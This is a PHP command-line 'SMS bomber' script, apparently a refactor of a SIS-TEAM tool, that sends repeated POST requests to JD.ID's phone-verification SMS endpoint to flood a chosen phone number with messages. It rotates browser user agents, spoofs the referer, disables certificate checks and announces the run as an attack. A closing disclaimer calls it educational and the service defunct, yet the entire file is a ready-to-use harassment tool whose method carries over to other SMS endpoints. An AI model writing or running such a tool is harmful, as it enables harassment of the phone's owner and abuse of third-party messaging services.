<?php

/**
 * SMS BOMBER JD.ID (Refactored)
 * Created/Refactored by Antigravity
 * Original Credits to SIS-TEAM
 */

class JDBomber
{
    private $target = "http://sc.jd.id/phone/sendPhoneSms";
    private $referer = "http://sc.jd.id/phone/bindingPhone.html";
    private $userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ];

    // Colors
    const RED = "\033[91m";
    const GREEN = "\033[92m";
    const YELLOW = "\033[93m";
    const CYAN = "\033[96m";
    const WHITE = "\033[97m";
    const RESET = "\033[0m";

    public function run()
    {
        $this->banner();
        $this->checkService();

        $phone = $this->input(self::YELLOW . "[?] Masukkan Nomor (ex: 8xxxx): " . self::RESET);
        $amount = $this->input(self::YELLOW . "[?] Masukkan Jumlah (Max: 50): " . self::RESET);
        $delay = $this->input(self::YELLOW . "[?] Jeda Detik (Min: 10): " . self::RESET);

        echo self::CYAN . "\n[!] Memulai serangan ke: $phone\n" . self::RESET;
        echo self::CYAN . "[!] Total: $amount | Jeda: $delay detik\n\n" . self::RESET;

        for ($i = 0; $i < $amount; $i++) {
            $response = $this->send($phone);

            // Timestamp
            $time = date('H:i:s');

            if ($response && $response['success']) {
                echo self::GREEN . "[{$time}] [SUCCESS] [✓] SMS Terkirim ke $phone\n" . self::RESET;
            } else {
                $msg = $response['message'] ?? 'Unknown Error';
                echo self::RED . "[{$time}] [FAILED]  [x] Gagal: $msg\n" . self::RESET;
            }

            if ($i < $amount - 1) {
                sleep((int)$delay);
            }
        }

        echo self::GREEN . "\n[✓] DONE ALL SENT\n" . self::RESET;
    }

    private function send($phone)
    {
        $ch = curl_init();
        $randomAgent = $this->userAgents[array_rand($this->userAgents)];

        curl_setopt($ch, CURLOPT_URL, $this->target);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=" . $phone . "&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, $this->referer);
        curl_setopt($ch, CURLOPT_USERAGENT, $randomAgent);

        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // Analyze response (Attempt to parse JSON if possible, otherwise crude check)
        // Since JD.ID is dead, this will likely return HTML or fail.
        // We simulate a structure for future-proofing.

        $success = false;
        $message = "HTTP Code: $httpCode";

        if ($output) {
            // Check for known success indicators in legacy output if available
            // For now, we assume if we get a 200 OK and some content, it's "Sent"
            // (Standard spammer logic usually trusts 200 OK)
            if ($httpCode == 200) {
                 $success = true; // Optimistic success
                 $message = trim(substr($output, 0, 50)) . "..."; // Show snippet
            }
        } else {
             $message = "Connection Failed";
        }

        return ['success' => $success, 'message' => $message];
    }

    private function input($prompt)
    {
        echo $prompt;
        return trim(fgets(STDIN));
    }

    private function banner()
    {
        system('clear'); // Mac/Linux clear
        echo self::CYAN . "============================================" . self::RESET . "\n";
        echo self::RED . " ____  __  ____      ____  ____   __   _  _ " . self::RESET . "\n";
        echo self::RED . "/ ___)(  )/ ___) ___(_  _)(  __) / _\ ( \/ )" . self::RESET . "\n";
        echo self::WHITE . "\___ \ )( \___ \(___) )(   ) _) /    \/ \/ \ " . self::RESET . "\n";
        echo self::WHITE . "(____/(__)(____/     (__) (____)\_/\_/\_)(_/" . self::RESET . "\n";
        echo self::CYAN . "============================================" . self::RESET . "\n";
        echo self::YELLOW . "  Thx For SIS-TEAM And All Member SIS-TEAM  " . self::RESET . "\n";
        echo self::CYAN . "============================================" . self::RESET . "\n";
        echo "\n";
    }

    private function checkService()
    {
        echo self::RED . "[!] WARNING: JD.ID Service is Discontinued (2023).\n";
        echo "[!] This script is for educational refactoring purposes only.\n";
        echo "[!] It will likely fail to send actual SMS.\n" . self::RESET;
        echo "\n";
    }
}

// Execute
$bomber = new JDBomber();
$bomber->run();
?>
